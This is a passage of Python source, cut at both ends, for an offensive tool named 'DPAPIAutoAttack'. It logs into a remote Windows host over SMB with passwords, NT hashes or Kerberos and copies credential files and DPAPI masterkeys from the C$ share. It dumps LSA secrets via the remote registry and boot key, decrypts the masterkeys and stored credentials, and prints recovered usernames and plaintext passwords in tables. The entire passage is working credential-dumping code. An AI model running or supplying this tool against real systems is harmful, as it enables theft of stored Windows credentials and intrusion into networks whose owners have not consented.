    r = {"target": "", "username": "", "password": "", "comment": ""}
    if not data or not isinstance(data, (bytes, bytearray)):
        return r

    strings, i = [], 0
    max_scan = min(len(data), MAX_FILE_SIZE)

    try:
        while i < max_scan - 3:
            try:
                if data[i + 1] == 0 and 0x20 <= data[i] <= 0x7E:
                    start = i
                    while i + 1 < max_scan and not (data[i] == 0 and data[i + 1] == 0):
                        i += 2
                    try:
                        s = data[start:i].decode("utf-16-le").strip()
                        if len(s) >= 3:
                            strings.append(s)
                    except (UnicodeDecodeError, Exception):
                        pass
                    i += 2
                else:
                    i += 1
            except IndexError:
                break
            except Exception as exc:
                logging.debug("UTF-16 scan iteration: %s", exc)
                i += 1
    except Exception as exc:
        logging.debug("UTF-16 scan: %s", exc)

    seen, unique = set(), []
    for s in strings:
        if s not in seen:
            seen.add(s)
            unique.append(s)

    try:
        for s in unique:
            if ("target=" in s.lower() or "\\" in s) and not r["target"]:
                r["target"] = s
            elif (len(s) <= 32 and
                  s.replace("_", "").replace("-", "").replace(".", "").isalnum() and
                  not r["username"]):
                r["username"] = s
            elif not r["password"]:
                r["password"] = s
    except Exception as exc:
        logging.debug("UTF-16 classification: %s", exc)

    return r


# =============================================================================
#  SMB helper
# =============================================================================

class SMBHelper:

    def __init__(self, cfg):
        if not cfg or not isinstance(cfg, dict):
            raise ValidationError("Invalid configuration dictionary")
        self._cfg        = cfg
        self._conn       = None
        self._connected  = False
        self._last_error = None

    def connect(self):
        _check_interrupt()
        t = self._cfg.get("target_ip")
        if not t:
            raise ConnectionError("No target IP in configuration")

        info("Testing TCP connectivity to %s:445 ..." % t)

        sock = None
        try:
            sock = socket.create_connection((t, 445), timeout=10)
            sock.close()
        except socket.gaierror:
            raise ConnectionError(
                "Cannot resolve '%s'. Check hostname/IP." % t
            ) from None
        except ConnectionRefusedError:
            raise ConnectionError(
                "Port 445 closed on %s. Enable SMB or open firewall." % t
            ) from None
        except socket.timeout:
            raise ConnectionError(
                "Connection to %s:445 timed out." % t
            ) from None
        except OSError as exc:
            if exc.errno == errno.ENETUNREACH:
                raise ConnectionError(
                    "Network unreachable. Check your network connection."
                ) from None
            elif exc.errno == errno.EHOSTUNREACH:
                raise ConnectionError(
                    "Host unreachable. Check routing to %s." % t
                ) from None
            elif exc.errno == errno.ECONNREFUSED:
                raise ConnectionError(
                    "Connection refused on %s:445." % t
                ) from None
            else:
                raise ConnectionError("Network error: %s" % exc) from None
        except Exception as exc:
            raise ConnectionError("Unexpected TCP error: %s" % exc) from None
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

        info("TCP OK. Negotiating SMB ...")
        cfg = self._cfg

        try:
            self._conn = SMBConnection(t, t)
        except Exception as exc:
            raise ConnectionError(
                "SMB negotiation failed: %s" % _friendly(exc)
            ) from None

        try:
            if cfg.get("use_kerberos"):
                try:
                    self._conn.kerberosLogin(
                        cfg.get("username", ""),
                        cfg.get("password", ""),
                        cfg.get("domain", ""),
                        cfg.get("lmhash", ""),
                        cfg.get("nthash", ""),
                        cfg.get("aes_key", ""),
                        cfg.get("dc_ip"),
                    )
                except SessionError as exc:
                    raise AuthenticationError(
                        "Kerberos authentication failed: %s" % _friendly(exc)
                    ) from None
                except Exception as exc:
                    raise AuthenticationError(
                        "Kerberos authentication failed: %s" % _friendly(exc)
                    ) from None
            else:
                try:
                    self._conn.login(
                        cfg.get("username", ""),
                        cfg.get("password", ""),
                        cfg.get("domain", ""),
                        lmhash=cfg.get("lmhash", ""),
                        nthash=cfg.get("nthash", ""),
                    )
                except SessionError as exc:
                    raise AuthenticationError(
                        "Authentication failed: %s" % _friendly(exc)
                    ) from None
                except Exception as exc:
                    raise AuthenticationError(
                        "Authentication failed: %s" % _friendly(exc)
                    ) from None
        except (ConnectionError, AuthenticationError):
            self._cleanup_failed_connection()
            raise
        except Exception as exc:
            self._cleanup_failed_connection()
            raise AuthenticationError(
                "Unexpected auth error: %s" % _friendly(exc)
            ) from None

        self._connected = True
        _CLEANUP.append(self)
        user_str = (
            "%s\\%s" % (cfg.get("domain", ""), cfg.get("username", ""))
            if cfg.get("domain") else cfg.get("username", "")
        )
        ok("Authenticated to %s as %s" % (t, user_str))

    def _cleanup_failed_connection(self):
        try:
            if self._conn:
                try:
                    self._conn.logoff()
                except Exception:
                    pass
                try:
                    self._conn.disconnect()
                except Exception:
                    pass
        except Exception:
            pass
        finally:
            self._conn      = None
            self._connected = False

    def disconnect(self):
        if not self._connected or self._conn is None:
            self._conn      = None
            self._connected = False
            return
        self._connected = False
        try:
            if self._conn:
                try:
                    self._conn.logoff()
                    logging.debug("SMB session closed.")
                except Exception as exc:
                    if "STATUS_USER_SESSION_DELETED" not in str(exc):
                        logging.debug("SMB logoff: %s", exc)
                finally:
                    try:
                        self._conn.disconnect()
                    except Exception:
                        pass
        except Exception as exc:
            logging.debug("SMB disconnect: %s", exc)
        finally:
            self._conn = None

    @property
    def conn(self):
        if self._conn is None:
            raise ResourceError("SMB not connected. Call connect() first.")
        if not self._connected:
            raise ResourceError("SMB connection was closed.")
        return self._conn

    def list_dir(self, share, path):
        _check_interrupt()
        if not share or not isinstance(share, str):
            logging.debug("Invalid share: %s", share)
            return []
        if not path or not isinstance(path, str):
            logging.debug("Invalid path: %s", path)
            return []
        try:
            entries = self._conn.listPath(share, ntpath.join(path, "*"))
            return [
                (e.get_longname(), e.is_directory())
                for e in entries
                if e.get_longname() not in (".", "..")
            ]
        except SessionError as exc:
            if not _is_silent_smb_error(exc):
                logging.debug("list_dir(%s): %s", path, exc)
            return []
        except Exception as exc:
            if not _is_silent_smb_error(exc):
                logging.debug("list_dir(%s): %s", path, exc)
            return []

    def get_file(self, share, path, filename):
        _check_interrupt()
        if not share or not isinstance(share, str):
            logging.debug("Invalid share: %s", share)
            return None
        if not path or not isinstance(path, str):
            logging.debug("Invalid path: %s", path)
            return None
        if not filename or not isinstance(filename, str):
            logging.debug("Invalid filename: %s", filename)
            return None
        fh = None
        try:
            fh = BytesIO()
            full_path = ntpath.join(path, filename)
            self._conn.getFile(share, full_path, fh.write)
            data = fh.getvalue()
            if len(data) > MAX_FILE_SIZE:
                logging.warning(
                    "File %s too large (%d bytes), skipping", filename, len(data)
                )
                return None
            return data if data else None
        except SessionError as exc:
            if not _is_silent_smb_error(exc):
                logging.debug("get_file(%s): %s", filename, exc)
            return None
        except MemoryError as exc:
            logging.error("Memory error reading %s: %s", filename, exc)
            return None
        except Exception as exc:
            if not _is_silent_smb_error(exc):
                logging.debug("get_file(%s): %s", filename, exc)
            return None
        finally:
            if fh:
                try:
                    fh.close()
                except Exception:
                    pass

    def user_profiles(self, share="C$"):
        _check_interrupt()
        if not share or not isinstance(share, str):
            logging.debug("Invalid share: %s", share)
            return []
        skip = {"All Users", "Default", "Default User", "Public", "desktop.ini"}
        seen, profiles = set(), []
        try:
            entries = self.list_dir(share, USER_PROFILE_BASE)
            for name, is_dir in entries:
                try:
                    if not is_dir or name in skip or name in seen:
                        continue
                    seen.add(name)
                    profiles.append(ntpath.join(USER_PROFILE_BASE, name))
                    logging.debug("Profile: %s", name)
                except Exception as exc:
                    logging.debug("Profile %s: %s", name, exc)
                    continue
        except Exception as exc:
            logging.debug("user_profiles: %s", exc)
        return profiles


# =============================================================================
#  Collector
# =============================================================================

class DPAPICollector:

    def __init__(self, smb):
        if smb is None:
            raise ValidationError("SMBHelper cannot be None")
        self._smb            = smb
        self.share           = "C$"
        self.raw_masterkeys  = {}
        self.raw_credentials = {}
        self._cred_hashes    = set()
        self.mk_to_sid       = {}
        self.sid_masterkeys  = {}
        self.mk_profile_path = {}

    def _add_cred(self, path, data):
        if not path or not isinstance(path, str):
            return False
        if not data or not isinstance(data, (bytes, bytearray)):
            return False
        if len(self.raw_credentials) >= MAX_CREDENTIALS:
            logging.warning("Maximum credential limit (%d) reached", MAX_CREDENTIALS)
            return False
        try:
            h = hash(data)
            if h in self._cred_hashes:
                logging.debug("Duplicate skipped: %s", ntpath.basename(path))
                return False
            self._cred_hashes.add(h)
            self.raw_credentials[path] = data
            return True
        except Exception as exc:
            logging.debug("Credential add: %s", exc)
            return False

    def collect_system_credentials(self):
        _check_interrupt()
        section("Collecting SYSTEM Credential Files")
        found = 0
        for path in SYSTEM_CRED_PATHS:
            _check_interrupt()
            try:
                entries = self._smb.list_dir(self.share, path)
                for name, is_dir in entries:
                    _check_interrupt()
                    try:
                        if is_dir or name in SKIP_NAMES:
                            continue
                        data = self._smb.get_file(self.share, path, name)
                        if data and self._add_cred(ntpath.join(path, name), data):
                            ok("SYSTEM credential: %s" % name)
                            found += 1
                    except Exception as exc:
                        logging.debug("System cred %s: %s", name, exc)
                        continue
            except Exception as exc:
                logging.debug("System cred path %s: %s", path, exc)
                continue
        if not found:
            info("No SYSTEM credential files found.")

    def collect_system_masterkeys(self):
        _check_interrupt()
        section("Collecting SYSTEM Masterkey Files")
        found = 0
        for mk_path in SYSTEM_MK_PATHS:
            _check_interrupt()
            try:
                entries = self._smb.list_dir(self.share, mk_path)
                for name, is_dir in entries:
                    _check_interrupt()
                    try:
                        if is_dir or not is_valid_mk_name(name):
                            continue
                        guid = name.lower()
                        if guid in self.raw_masterkeys:
                            continue
                        if len(self.raw_masterkeys) >= MAX_MASTERKEYS:
                            logging.warning("Maximum masterkey limit reached")
                            break
                        data = self._smb.get_file(self.share, mk_path, name)
                        self.raw_masterkeys[guid] = data
                        if data:
                            ok("SYSTEM masterkey: %s" % guid)
                            found += 1
                    except Exception as exc:
                        logging.debug("System MK %s: %s", name, exc)
                        continue
            except Exception as exc:
                logging.debug("System MK path %s: %s", mk_path, exc)
                continue
        if not found:
            info("No SYSTEM masterkey files found.")

    def collect_user_credentials(self):
        _check_interrupt()
        section("Collecting User Credential Files")
        found = 0
        try:
            profiles = self._smb.user_profiles(self.share)
        except Exception as exc:
            logging.error("Failed to enumerate profiles: %s", exc)
            info("No user credential files found.")
            return
        for profile in profiles:
            _check_interrupt()
            try:
                uname = ntpath.basename(profile)
                for rel in USER_CRED_RELATIVE:
                    _check_interrupt()
                    try:
                        path = ntpath.join(profile, rel)
                        entries = self._smb.list_dir(self.share, path)
                        for name, is_dir in entries:
                            _check_interrupt()
                            try:
                                if is_dir or name in SKIP_NAMES:
                                    continue
                                data = self._smb.get_file(self.share, path, name)
                                if data and self._add_cred(ntpath.join(path, name), data):
                                    ok("User credential (%s): %s" % (uname, name))
                                    found += 1
                            except Exception as exc:
                                logging.debug("User cred %s: %s", name, exc)
                                continue
                    except Exception as exc:
                        logging.debug("User cred path: %s", exc)
                        continue
            except Exception as exc:
                logging.debug("Profile %s: %s", profile, exc)
                continue
        if not found:
            info("No user credential files found.")

    def collect_user_masterkeys(self):
        _check_interrupt()
        section("Collecting User Masterkey Files")
        found = 0
        try:
            profiles = self._smb.user_profiles(self.share)
        except Exception as exc:
            logging.error("Failed to enumerate profiles: %s", exc)
            info("No user masterkey files found.")
            return
        for profile in profiles:
            _check_interrupt()
            try:
                uname = ntpath.basename(profile)
                for rel in USER_MK_RELATIVE:
                    _check_interrupt()
                    try:
                        protect     = ntpath.join(profile, rel)
                        sid_entries = self._smb.list_dir(self.share, protect)
                        for sid_name, is_dir in sid_entries:
                            _check_interrupt()
                            try:
                                if not is_dir:
                                    continue
                                sid_path   = ntpath.join(protect, sid_name)
                                mk_entries = self._smb.list_dir(self.share, sid_path)
                                for mk_name, mk_is_dir in mk_entries:
                                    _check_interrupt()
                                    try:
                                        if mk_is_dir or not is_valid_mk_name(mk_name):
                                            continue
                                        guid = mk_name.lower()
                                        if guid in self.raw_masterkeys:
                                            continue
                                        if len(self.raw_masterkeys) >= MAX_MASTERKEYS:
                                            logging.warning("Maximum masterkey limit reached")
                                            break
                                        data = self._smb.get_file(
                                            self.share, sid_path, mk_name
                                        )
                                        self.raw_masterkeys[guid]      = data
                                        self.mk_to_sid[guid]           = sid_name
                                        self.mk_profile_path[guid]     = sid_path
                                        if sid_name not in self.sid_masterkeys:
                                            self.sid_masterkeys[sid_name] = []
                                        self.sid_masterkeys[sid_name].append(guid)
                                        if data:
                                            ok("User MK (%s): %s  SID:%s" % (
                                                uname, guid, sid_name))
                                            found += 1
                                    except Exception as exc:
                                        logging.debug("MK %s: %s", mk_name, exc)
                                        continue
                            except Exception as exc:
                                logging.debug("SID %s: %s", sid_name, exc)
                                continue
                    except Exception as exc:
                        logging.debug("Protect path: %s", exc)
                        continue
            except Exception as exc:
                logging.debug("Profile %s: %s", profile, exc)
                continue
        if not found:
            info("No user masterkey files found.")

    def fetch_required_masterkeys(self):
        _check_interrupt()
        section("Fetching Missing Masterkeys")
        missing = fetched = 0

        for path, data in list(self.raw_credentials.items()):
            _check_interrupt()
            try:
                mkid = self._get_mkid(data)
                if not mkid:
                    continue
                guid = mkid.lower()
                if guid in self.raw_masterkeys and self.raw_masterkeys[guid] is not None:
                    continue
                if len(self.raw_masterkeys) >= MAX_MASTERKEYS:
                    logging.warning("Maximum masterkey limit reached")
                    break

                missing += 1
                info("Fetching masterkey: %s" % guid)
                found_data = None

                if guid in self.mk_profile_path:
                    try:
                        found_data = self._smb.get_file(
                            self.share, self.mk_profile_path[guid], mkid
                        )
                    except Exception as exc:
                        logging.debug("Known path fetch: %s", exc)

                if not found_data:
                    for p in SYSTEM_MK_PATHS:
                        _check_interrupt()
                        try:
                            found_data = self._smb.get_file(self.share, p, mkid)
                            if found_data:
                                break
                        except Exception as exc:
                            logging.debug("SYSTEM path fetch: %s", exc)
                            continue

                if not found_data:
                    try:
                        profiles = self._smb.user_profiles(self.share)
                    except Exception as exc:
                        logging.debug("Profile enum: %s", exc)
                        profiles = []
                    for profile in profiles:
                        _check_interrupt()
                        if found_data:
                            break
                        try:
                            for rel in USER_MK_RELATIVE:
                                _check_interrupt()
                                try:
                                    protect = ntpath.join(profile, rel)
                                    for sid_name, is_dir in self._smb.list_dir(
                                        self.share, protect
                                    ):
                                        _check_interrupt()
                                        if not is_dir:
                                            continue
                                        try:
                                            sid_path = ntpath.join(protect, sid_name)
                                            found_data = self._smb.get_file(
                                                self.share, sid_path, mkid
                                            )
                                            if found_data:
                                                self.mk_to_sid[guid]       = sid_name
                                                self.mk_profile_path[guid] = sid_path
                                                break
                                        except Exception as exc:
                                            logging.debug("Profile MK fetch: %s", exc)
                                            continue
                                    if found_data:
                                        break
                                except Exception as exc:
                                    logging.debug("Relative path: %s", exc)
                                    continue
                        except Exception as exc:
                            logging.debug("Profile iter: %s", exc)
                            continue

                if found_data:
                    self.raw_masterkeys[guid] = found_data
                    ok("Retrieved masterkey: %s" % guid)
                    fetched += 1
                else:
                    self.raw_masterkeys[guid] = None
                    warn("Could not retrieve masterkey: %s" % guid)
            except Exception as exc:
                logging.debug("Fetch iteration: %s", exc)
                continue

        if missing == 0:
            info("All masterkeys already collected.")
        else:
            info("Fetched %d/%d missing masterkey(s)." % (fetched, missing))

    def _get_mkid(self, raw):
        if not raw or not isinstance(raw, (bytes, bytearray)):
            return None
        if len(raw) < 16:
            return None
        try:
            return bin_to_string(
                DPAPI_BLOB(CredentialFile(raw)["Data"])["GuidMasterKey"]
            )
        except Exception:
            pass
        try:
            return bin_to_string(DPAPI_BLOB(raw)["GuidMasterKey"])
        except Exception:
            return None

    def summary(self):
        section("Collection Summary")
        try:
            info("Unique credential files  : %d" % len(self.raw_credentials))
            info("Masterkey files          : %d" % len(self.raw_masterkeys))
            info("User SIDs found          : %d" % len(self.sid_masterkeys))
            for sid, guids in self.sid_masterkeys.items():
                try:
                    info("  %s: %d masterkey(s)" % (sid, len(guids)))
                except Exception as exc:
                    logging.debug("Summary SID: %s", exc)
            if not self.raw_credentials:
                warn("No credentials found. Verify the account has C$ read access.")
        except Exception as exc:
            logging.error("Summary generation: %s", exc)


# =============================================================================
#  Key extractor
# =============================================================================

class KeyExtractor:

    def __init__(self, smb, cfg):
        if smb is None:
            raise ValidationError("SMBHelper cannot be None")
        if not cfg or not isinstance(cfg, dict):
            raise ValidationError("Configuration must be a dictionary")
        self._smb        = smb
        self._cfg        = cfg
        self._remoteOps  = None
        self.machine_key = None
        self.user_key    = None

    def _cb(self, secret_type, secret):
        if not secret or not isinstance(secret, str):
            return
        if not secret.startswith("dpapi_machinekey:"):
            return
        try:
            parts = secret.split("\n")
            if len(parts) < 2:
                logging.debug("DPAPI_SYSTEM callback: insufficient parts")
                return
            mk = parts[0].split(":", 1)[1].strip().lower().lstrip("0x")
            uk = parts[1].split(":", 1)[1].strip().lower().lstrip("0x")
            self.machine_key = safe_unhexlify(mk)
            self.user_key    = safe_unhexlify(uk)
            if self.machine_key:
                ok("DPAPI MachineKey : 0x%s" % hexlify(self.machine_key).decode())
            if self.user_key:
                ok("DPAPI UserKey    : 0x%s" % hexlify(self.user_key).decode())
        except IndexError as exc:
            logging.debug("DPAPI_SYSTEM callback index: %s", exc)
        except Exception as exc:
            logging.debug("DPAPI_SYSTEM callback: %s", exc)

    def dump_lsa(self):
        _check_interrupt()
        section("Dumping LSA Secrets (DPAPI_SYSTEM)")
        try:
            try:
                self._remoteOps = RemoteOperations(
                    self._smb.conn,
                    self._cfg.get("use_kerberos", False),
                    self._cfg.get("dc_ip"),
                )
                _CLEANUP.append(self._remoteOps)
            except Exception as exc:
                handle_error("RemoteOperations init failed", exc)
                self._cleanup()
                return False

            try:
                self._remoteOps.enableRegistry()
            except Exception as exc:
                handle_error("Cannot enable registry", exc)
                self._cleanup()
                return False

            try:
                bootkey = self._remoteOps.getBootKey()
                if bootkey:
                    info("Boot key : 0x%s" % hexlify(bootkey).decode())
                else:
                    warn("Boot key is empty")
                    self._cleanup()
                    return False
            except Exception as exc:
                handle_error("Cannot get boot key", exc)
                self._cleanup()
                return False

            try:
                lsa_secrets = RemoteLSASecrets(
                    bootkey, self._remoteOps, perSecretCallback=self._cb
                )
                lsa_secrets.dumpSecrets()
            except Exception as exc:
                handle_error("LSA dump failed", exc)
                self._cleanup()
                return False

            self._cleanup()
            if self.user_key is None:
                warn("DPAPI_SYSTEM not found in LSA.")
                return False
            return True
        except Exception as exc:
            handle_error("Unexpected LSA dump error", exc)
            self._cleanup()
            return False

    def _cleanup(self):
        try:
            if self._remoteOps:
                try:
                    self._remoteOps.finish()
                    logging.debug("RemoteOperations finished.")
                except Exception as exc:
                    if "DEPENDENT_SERVICES" not in str(exc):
                        logging.debug("RemoteOps cleanup: %s", _friendly(exc))
                finally:
                    self._remoteOps = None
        except Exception as exc:
            logging.debug("Cleanup: %s", exc)


# =============================================================================
#  Masterkey decryptor
# =============================================================================

class MasterkeyDecryptor:

    def __init__(self):
        self.decrypted = {}

    def decrypt_with_system_key(self, raw_mks, user_key, machine_key=None):
        _check_interrupt()
        section("Decrypting Masterkeys with SYSTEM Keys")
        if not user_key:
            warn("No SYSTEM userkey.")
            return
        if not isinstance(user_key, (bytes, bytearray)):
            warn("Invalid userkey type.")
            return
        cands = [("UserKey", user_key)]
        if machine_key and isinstance(machine_key, (bytes, bytearray)):
            cands.append(("MachineKey", machine_key))
        avail = 0
        for guid, raw in raw_mks.items():
            _check_interrupt()
            try:
                if raw is None:
                    continue
                avail += 1
                if guid in self.decrypted:
                    continue
                self._try(guid, raw, cands)
            except Exception as exc:
                logging.debug("System MK decrypt %s: %s", guid, exc)
                continue
        info("Decrypted %d/%d masterkeys with SYSTEM keys." % (
            len(self.decrypted), avail))

    def decrypt_with_user_password(self, raw_mks, mk_to_sid, sid, password):
        _check_interrupt()
        section("Decrypting User Masterkeys — password (SID:%s)" % sid)
        if not password:
            warn("Empty password. Skipping.")
            return
        if not sid or not isinstance(sid, str):
            warn("Invalid SID.")
            return
        try:
            k1, k2, k3 = deriveKeysFromUser(sid, password)
        except Exception as exc:
            handle_error("Key derivation failed", exc)
            return
        for guid, raw in raw_mks.items():
            _check_interrupt()
            try:
                if raw is None or guid in self.decrypted:
                    continue
                if mk_to_sid.get(guid) != sid:
                    continue
                self._try(guid, raw, [("SHA1", k1), ("MD4", k2), ("MD4p", k3)])
            except Exception as exc:
                logging.debug("User password MK decrypt %s: %s", guid, exc)
                continue

    def decrypt_with_user_hash(self, raw_mks, mk_to_sid, sid, nthash_hex):
        _check_interrupt()
        section("Decrypting User Masterkeys — NT hash (SID:%s)" % sid)
        if not nthash_hex:
            warn("Empty NT hash. Skipping.")
            return
        if not sid or not isinstance(sid, str):
            warn("Invalid SID.")
            return
        try:
            nt = safe_unhexlify(nthash_hex)
            if nt is None:
                warn("Invalid NT hash format.")
                return
            k1, k2 = deriveKeysFromUserkey(sid, nt)
        except Exception as exc:
            handle_error("Hash key derivation failed", exc)
            return
        for guid, raw in raw_mks.items():
            _check_interrupt()
            try:
                if raw is None or guid in self.decrypted:
                    continue
                if mk_to_sid.get(guid) != sid:
                    continue
                self._try(guid, raw, [("NThash-k1", k1), ("NThash-k2", k2)])
            except Exception as exc:
                logging.debug("User hash MK decrypt %s: %s", guid, exc)
                continue

    def _try(self, guid, raw, cands):
        if not raw or not isinstance(raw, (bytes, bytearray)):
            fail("Invalid raw data for %s..." % guid[:8])
            return
        if not cands:
            fail("No decryption candidates for %s..." % guid[:8])
            return
        try:
            mkf  = MasterKeyFile(raw)
            tail = raw[len(mkf):]
            mk = bkmk = None
            if mkf.get("MasterKeyLen", 0) > 0:
                mk_len = mkf["MasterKeyLen"]
                if 0 < mk_len <= len(tail):
                    mk   = MasterKey(tail[:mk_len])
                    tail = tail[len(mk):]
                else:
                    logging.debug("Invalid MasterKeyLen %d for %s", mk_len, guid)
            if mkf.get("BackupKeyLen", 0) > 0:
                bk_len = mkf["BackupKeyLen"]
                if 0 < bk_len <= len(tail):
                    bkmk = MasterKey(tail[:bk_len])
                else:
                    logging.debug("Invalid BackupKeyLen %d for %s", bk_len, guid)
        except struct.error as exc:
            fail("MK struct error %s...: %s" % (guid[:8], exc))
            return
        except Exception as exc:
            fail("MK parse error %s...: %s" % (guid[:8], exc))
            return

        for label, key in cands:
            if not key or not isinstance(key, (bytes, bytearray)):
                continue
            for blob, bname in [(mk, "MK"), (bkmk, "BackupMK")]:
                if blob is None:
                    continue
                try:
                    dec = blob.decrypt(key)
                    if dec:
                        self.decrypted[guid] = dec
                        ok("%s %s... -> %s  key=0x%s..." % (
                            bname, guid[:8], label,
                            hexlify(dec).decode()[:24]))
                        return
                except Exception:
                    pass
        fail("Could not decrypt masterkey: %s" % guid)


# =============================================================================
#  Credential decryptor
# =============================================================================

class CredentialDecryptor:

    def __init__(self, decrypted_mks):
        self._mks    = decrypted_mks if decrypted_mks is not None else {}
        self.results = []

    def decrypt_all(self, raw_creds):
        _check_interrupt()
        section("Decrypting Credentials")
        if not raw_creds:
            warn("No credential files to decrypt.")
            return
        if not isinstance(raw_creds, dict):
            warn("Invalid credentials format.")
            return
        count = 0
        for path, raw in raw_creds.items():
            _check_interrupt()
            try:
                self._one(path, raw)
                count += 1
                if count % 100 == 0:
                    logging.info("Processed %d/%d credentials...", count, len(raw_creds))
            except Exception as exc:
                try:
                    basename = ntpath.basename(str(path)) if path else "unknown"
                except Exception:
                    basename = "unknown"
                handle_error("Error on %s" % basename, exc)

    def _one(self, path, raw):
        if not path:
            logging.debug("Empty credential path")
            return
        try:
            fname = ntpath.basename(path)
        except Exception:
            fname = str(path)

        logging.debug("Processing: %s", fname)
        if not raw:
            fail("Empty data for %s" % fname)
            return
        if not isinstance(raw, (bytes, bytearray)):
            fail("Invalid data type for %s" % fname)
            return

        blob = None
        try:
            cf   = CredentialFile(raw)
            blob = DPAPI_BLOB(cf["Data"])
        except Exception:
            try:
                blob = DPAPI_BLOB(raw)
            except Exception as exc:
                fail("Cannot parse blob in %s: %s" % (fname, exc))
                return

        if blob is None:
            fail("Could not create DPAPI blob for %s" % fname)
            return

        try:
            mkid = bin_to_string(blob["GuidMasterKey"])
        except Exception as exc:
            fail("Cannot read MK GUID from %s: %s" % (fname, exc))
            return

        guid   = mkid.lower() if mkid else ""
        mk_key = (self._mks.get(guid) or self._mks.get(mkid)) if mkid else None
        if mk_key is None:
            warn("No decrypted masterkey for %s  (MK:%s...)" % (
                fname, mkid[:8] if mkid else "unknown"))
            return

        try:
            decrypted = blob.decrypt(mk_key)
        except Exception as exc:
            handle_error("Decrypt error for %s" % fname, exc)
            return

        if decrypted is None:
            fail("Decryption returned nothing for %s" % fname)
            return

        try:
            parsed = parse_decrypted_credential(decrypted)
            parsed["path"] = path
            self.results.append(parsed)
        except Exception as exc:
            handle_error("Parse error for %s" % fname, exc)

    def print_results(self):
        section("RECOVERED CREDENTIALS")
        if not self.results:
            warn("No credentials recovered.")
            info("Common reasons:")
            info("  1. User credentials need a password — re-run and answer y")
            info("     when asked to decrypt user masterkeys")
            info("  2. Masterkeys could not be decrypted with SYSTEM key")
            info("  3. No credential files exist on this target")
            return
        try:
            w_t, w_u = 42, 25
            print("\n  %-4s %-42s %-25s %s" % ("#", "Target", "Username", "Password"))
            print("  %s %s %s %s" % ("-" * 4, "-" * w_t, "-" * w_u, "-" * 35))
            for i, r in enumerate(self.results, 1):
                try:
                    t = (r.get("target", "")   or "N/A")[:w_t - 1]
                    u = (r.get("username", "") or "N/A")[:w_u - 1]
                    p =  r.get("password", "") or "N/A"
                    print("  %-4d %-42s %-25s %s" % (i, t, u, p))
                except Exception as exc:
                    logging.debug("Result print: %s", exc)
                    continue
            print("\n  Total: %d credential(s) recovered" % len(self.results))
        except Exception as exc:
            logging.error("Results table: %s", exc)
            print("\n  Total: %d credential(s) recovered" % len(self.results))

    def dump_full(self):
        if not self.results:
            return
        print()
        for r in self.results:
            try:
                path     = r.get("path", "")
                basename = ntpath.basename(path) if path else "unknown"
                print("  +=== CREDENTIAL ========================================+")
                print("  |  File         : %s" % basename)
                print("  |  Last Written : %s" % r.get("last_written", "N/A"))
                print("  |  Target       : %s" % r.get("target",       "N/A"))
                print("  |  Username     : %s" % r.get("username",     "N/A"))
                print("  |  Password     : %s" % r.get("password",     "N/A"))
                if r.get("comment"):
                    print("  |  Comment      : %s" % r["comment"])
                print("  +=======================================================+")
                print()
            except Exception as exc:
                logging.debug("Full dump: %s", exc)
                continue


# =============================================================================
#  User key engine
# =============================================================================

class UserKeyEngine:

    def __init__(self, collector, decryptor):
        if collector is None:
            raise ValidationError("Collector cannot be None")
        if decryptor is None:
            raise ValidationError("Decryptor cannot be None")
        self._c = collector
        self._d = decryptor

    def attempt(self):
        _check_interrupt()
        try:
            undecrypted = {
                g for g, raw in self._c.raw_masterkeys.items()
                if g not in self._d.decrypted and raw is not None
            }
        except Exception as exc:
            logging.error("Undecrypted MK calculation: %s", exc)
            return

        if not undecrypted:
            info("All collected masterkeys have been decrypted.")
            return

        try:
            pending = {
                self._c.mk_to_sid[g]
                for g in undecrypted if g in self._c.mk_to_sid
            }
        except Exception as exc:
            logging.error("Pending SIDs: %s", exc)
            pending = set()

        if not pending:
            warn("%d masterkey(s) remain encrypted." % len(undecrypted))
            warn("No SID information available for them.")
            return

        section("User Masterkey Decryption")
        warn("%d masterkey(s) still encrypted." % len(undecrypted))
        info("Affected user SIDs:")
        for sid in pending:
            info("  - %s" % sid)
        info("You need the user password or NT hash to decrypt these.")

        if not _ask_yn("Decrypt user masterkeys with user credentials?",
                       default=False):
            return

        for sid in pending:
            _check_interrupt()
            try:
                print("\n  SID: %s" % sid)
                print("  +-- Decryption method ----------------------------------+")
                print("  |  1. Plaintext password  (default)                    |")
                print("  |  2. NT hash             (exactly 32 hex chars)       |")
                print("  |  3. Skip this SID                                    |")
                print("  +------------------------------------------------------+")

                method = _ask_choice("Method", valid={"1", "2", "3"}, default="1")

                if method == "1":
                    pw = _ask_password("Password for SID %s" % sid)
                    try:
                        self._d.decrypt_with_user_password(
                            self._c.raw_masterkeys, self._c.mk_to_sid, sid, pw
                        )
                    except Exception as exc:
                        handle_error("User password decrypt for %s" % sid, exc)

                elif method == "2":
                    try:
                        nt = _ask_field(
                            "NT hash for SID %s (32 hex chars, no 0x prefix)" % sid,
                            validator=_val_nt_hash_for_mk,
                        )
                        self._d.decrypt_with_user_hash(
                            self._c.raw_masterkeys, self._c.mk_to_sid, sid, nt
                        )
                    except Exception as exc:
                        handle_error("User hash decrypt for %s" % sid, exc)

                else:
                    info("Skipped SID: %s" % sid)

            except Exception as exc:
                handle_error("SID processing for %s" % sid, exc)
                continue


# =============================================================================
#  Orchestrator
# =============================================================================

class DPAPIAutoAttack:

    def __init__(self, cfg):
        if not cfg or not isinstance(cfg, dict):
            raise ValidationError("Configuration must be a non-empty dictionary")
        self._cfg = cfg
        try:
            self._smb     = SMBHelper(cfg)
            self._collect = DPAPICollector(self._smb)
            self._keyext  = KeyExtractor(self._smb, cfg)
            self._mkdec   = MasterkeyDecryptor()
            self._creddec = CredentialDecryptor({})
        except Exception as exc:
            handle_error("Initialization failed", exc, fatal=True)

    def run(self):
        try:
            self._connect()
            self._collect_all()
            self._get_keys()
            self._decrypt_mks()
            self._user_keys()
            self._decrypt_creds()
            self._results()
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\n\n  [!] Interrupted.")
        except (ConnectionError, AuthenticationError) as exc:
            fail(str(exc))
        except RuntimeError as exc:
            fail(str(exc))
            if DEBUG_MODE:
                tb.print_exc()
        except Exception as exc:
            handle_error("Unexpected fatal error", exc)
        finally:
            self._cleanup()

    def _connect(self):
        section("Connecting to Target")
        try:
            self._smb.connect()
        except (ConnectionError, AuthenticationError):
            raise
        except Exception as exc:
            raise RuntimeError("Connection failed: %s" % exc) from None

    def _collect_all(self):
        try:
            if self._cfg.get("do_system"):
                self._collect.collect_system_credentials()
                self._collect.collect_system_masterkeys()
            if self._cfg.get("do_users"):
                self._collect.collect_user_credentials()
                self._collect.collect_user_masterkeys()
            self._collect.fetch_required_masterkeys()
